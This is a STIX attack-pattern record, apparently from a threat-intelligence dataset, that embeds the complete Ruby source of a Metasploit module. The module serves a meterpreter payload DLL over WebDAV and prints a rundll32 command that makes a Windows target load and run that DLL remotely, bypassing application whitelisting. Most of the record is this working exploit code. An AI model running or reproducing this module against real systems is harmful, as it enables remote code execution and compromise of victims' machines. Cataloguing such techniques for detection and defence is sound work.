{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fae8c7c2-0a5d-42a0-88fe-317a3b2e8941",
    "created": "2024-08-14T16:46:41.9023Z",
    "modified": "2024-08-14T16:46:41.902304Z",
    "name": "Serve DLL via webdav server",
    "description": "( This module simplifies the rundll32.exe Application Whitelisting Bypass technique. The module creates a webdav server that hosts a dll file. When the user types the provided rundll32 command on a system, rundll32 will load the dll remotly and execute the provided export function. The export function needs to be valid, but the default meterpreter function can be anything. The process does write the dll to C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Temp\\TfsStore\\Tfs_DAV but does not load the dll from that location. This file should be removed after execution. The extension can be anything you'd like, but you don't have to use one. Two files will be written to disk. One named the requested name and one with a dll extension attached. ) 'License'      => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/webdav_delivery.rb",
            "external_id": "webdav_delivery.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'         => 'Serve DLL via webdav server',\n      'Description'  => %q(\n        This module simplifies the rundll32.exe Application Whitelisting Bypass technique.\n        The module creates a webdav server that hosts a dll file. When the user types the provided rundll32\n        command on a system, rundll32 will load the dll remotly and execute the provided export function.\n        The export function needs to be valid, but the default meterpreter function can be anything.\n        The process does write the dll to C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Temp\\TfsStore\\Tfs_DAV\n        but does not load the dll from that location. This file should be removed after execution.\n        The extension can be anything you'd like, but you don't have to use one. Two files will be\n        written to disk. One named the requested name and one with a dll extension attached.\n      ),\n      'License'      => MSF_LICENSE,\n      'Author'       =>\n        [\n          'Ryan Hanson <ryan.hanson[at]optiv.com>', # research  discovery (@ryhanson)\n          'James Cook <james.cook[at]optiv.com>'    # MSF Module (@_jbcook)\n        ],\n      'Targets'        => [['Automatic', {}]],\n      'Platform'       => %w[win],\n      'Arch'           => [ARCH_X86, ARCH_X64],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '1999-01-01'))\n    register_options(\n      [\n        OptString.new('URIPATH', [true, 'The URI to use (do not change).', '/'])\n      ], self.class\n    )\n  end\n\n  def primer\n    if datastore['URIPATH'] != '/'\n      fail_with(Failure::BadConfig, 'Using WebDAV requires URIPATH=/')\n    end\n    print_status('Run the following command on the target machine:')\n    webdav = ''\n    if datastore['SSL']\n      if datastore['SRVPORT'] != 443\n        fail_with(Failure::BadConfig, 'SRVPORT must be 443')\n      end\n      webdav = \"#{datastore['SRVHOST']}@ssl\"\n    else\n      webdav = \"#{datastore['SRVHOST']}@#{datastore['SRVPORT']}\"\n    end\n    print_line(\"rundll32.exe \\\\\\\\#{webdav}\\\\ANYTHING,Init\")\n  end\n\n  def on_request_uri(cli, _request)\n    if _request.uri.downcase =~ /\\.config/\n      process_ignore(cli, _request)\n      return\n    elsif _request.uri.downcase =~ /\\.manifest/\n      process_ignore(cli, _request)\n      return\n    end\n    case _request.method\n    when 'OPTIONS'\n      process_options(cli, _request)\n    when 'PROPFIND'\n      process_propfind(cli, _request)\n    when 'GET'\n      process_get(cli, _request)\n    else\n      process_ignore(cli, _request)\n    end\n  end\n\n  # Cli comes from Rex, not from the HttpServer mixin, so we need to make our own send_not_found\n  def send_not_found(cli)\n    resp_404 = create_response(404, 'Not Found')\n    resp_404.body = %Q{\\\n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>404 Not Found</title>\n</head><body>\n<h1>Not Found</h1>\n<p>The requested URL was not found on this server.</p>\n<hr>\n<address>Apache/2.2.9 (Unix) Server at #{datastore['LHOST']} Port #{datastore['SRVPORT']}</address>\n</body></html>\n}\n\n    cli.send_response(resp_404)\nend\n\n  def process_ignore(cli, _request)\n    vprint_status(\"#{_request.method} => 404 (#{_request.uri})\")\n    send_not_found(cli)\n  end\n\n  def process_options(cli, request)\n    vprint_status(\"OPTIONS #{request.uri}\")\n    headers = {\n      'Allow' => 'GET,HEAD,PUT,DELETE,MKCOL,COPY,MOVE,PROPFIND,OPTIONS',\n      'DAV' => '1',\n      'Connection' => 'keep-alive'\n    }\n    resp = create_response(207, 'Multi-Status')\n    headers.each_pair { |k, v| resp[k] = v }\n    resp.body = ''\n    cli.send_response(resp)\n  end\n\n  def process_propfind(cli, request)\n    vprint_status(\"PROPFIND #{request.uri}\")\n    changed = Time.now.strftime('%a, %d %b %Y %H:%M:%S GMT')\n    created = Time.now.strftime('%Y-%m-%dT%H:%M:%SZ')\n    filename = request.uri.delete('/')\n    p = regenerate_payload(cli)\n    data = generate_payload_dll(code: p.encoded)\n    prop_resp = prop_response(filename, created, data.length, changed)\n    vprint_status(\"Resp: #{prop_resp}\")\n    resp = create_response(207, 'Multi-Status')\n    headers = {\n      'Transfer-Encoding' => 'chuncked',\n      'Connection' => 'keep-alive'\n    }\n    headers.each_pair { |k, v| resp[k] = v }\n    resp.body = prop_resp\n    cli.send_response(resp)\n  end\n\n  def process_get(cli, request)\n    print_status(\"GET #{request.uri}\")\n    resp = create_response(200, 'OK')\n    headers = {\n      'Content-Type' => 'aplication/octet-stream',\n      'Accept-Range' => 'bytes'\n    }\n    headers.each_pair { |k, v| resp[k] = v }\n    p = regenerate_payload(cli)\n    data = generate_payload_dll(code: p.encoded)\n    resp.body = data\n    cli.send_response(resp)\n  end\n\n  def prop_response(filename, created, length, changed)\n    %(<?xml version=\"1.0\" encoding=\"utf-8\" ?>\n<D:multistatus xmlns:D=\"DAV:\">\n<D:response>\n<D:href>/#{filename}</D:href>\n<D:propstat>\n<D:prop>\n<D:creationdate>#{created}</D:creationdate>\n<D:displayname>#{filename}</D:displayname>\n<D:getcontentlanguage/>\n<D:getcontentlength>#{length}</D:getcontentlength>\n<D:getcontenttype/>\n<D:getetag/>\n<D:getlastmodified>#{changed}</D:getlastmodified>\n<D:lockdiscovery/>\n<D:resourcetype/>\n<D:source/>\n<D:supportedlock/>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n</D:multistatus>)\n  end\nend\n",
    "x_mitre_disclosure_date": "1999-01-01",
    "x_mitre_platforms": [
        "%w[win]"
    ]
}